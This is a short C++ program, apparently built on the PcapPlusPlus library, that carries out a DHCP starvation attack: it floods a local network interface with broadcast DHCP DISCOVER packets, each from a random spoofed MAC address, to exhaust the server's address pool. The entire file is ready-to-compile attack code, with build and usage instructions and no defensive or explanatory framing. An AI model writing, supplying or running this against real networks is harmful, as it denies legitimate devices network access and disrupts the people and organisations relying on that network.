// ============================================================
// dhcp_starve.cpp — exhaust DHCP pool with random MACs
// ------------------------------------------------------------
// Compile: clang++ -std=c++17 -O2 -o dhcp_starve dhcp_starve.cpp \
//          -I/opt/homebrew/include -L/opt/homebrew/lib \
//          -lPcap++ -lPacket++ -lCommon++ -lpcap
// Usage:   sudo ./dhcp_starve <iface> <count>
// ============================================================
#include "PcapLiveDeviceList.h"
#include "EthLayer.h"
#include "IPv4Layer.h"
#include "UdpLayer.h"
#include "PayloadLayer.h"
#include "Packet.h"
#include <cstdio>
#include <cstdlib>
#include <random>
#include <unistd.h>

int main(int argc, char** argv) {
    if (argc < 3) return 1;
    auto* dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(argv[1]);
    if (!dev || !dev->open()) return 1;

    std::mt19937 rng{std::random_device{}()};
    int count = std::atoi(argv[2]);

    // DHCP DISCOVER payload (simplified)
    uint8_t dhcp[244] = {0};
    dhcp[0] = 1; // bootp op = request
    dhcp[1] = 1; dhcp[2] = 6; // htype=eth, hlen=6
    dhcp[236] = 0x63; dhcp[237] = 0x82; dhcp[238] = 0x53; dhcp[239] = 0x63;
    dhcp[240] = 53; dhcp[241] = 1; dhcp[242] = 1; // msg type = DISCOVER
    dhcp[243] = 255;

    for (int i = 0; i < count; i++) {
        pcpp::MacAddress mac(
            (uint8_t)(rng() & 0xff), (uint8_t)(rng() & 0xff),
            (uint8_t)(rng() & 0xff), (uint8_t)(rng() & 0xff),
            (uint8_t)(rng() & 0xff), (uint8_t)(rng() & 0xff));
        memcpy(dhcp + 28, mac.getRawData(), 6);

        pcpp::EthLayer eth(mac, pcpp::MacAddress("ff:ff:ff:ff:ff:ff"), PCPP_ETHERTYPE_IP);
        pcpp::IPv4Layer ip(pcpp::IPv4Address("0.0.0.0"), pcpp::IPv4Address("255.255.255.255"));
        pcpp::UdpLayer udp(68, 67);
        pcpp::PayloadLayer pay(dhcp, sizeof(dhcp), false);

        pcpp::Packet pkt(100);
        pkt.addLayer(&eth); pkt.addLayer(&ip);
        pkt.addLayer(&udp); pkt.addLayer(&pay);
        pkt.computeCalculateFields();
        dev->sendPacket(&pkt);
    }
    std::printf("[+] sent %d DISCOVERs\n", count);
    return 0;
}
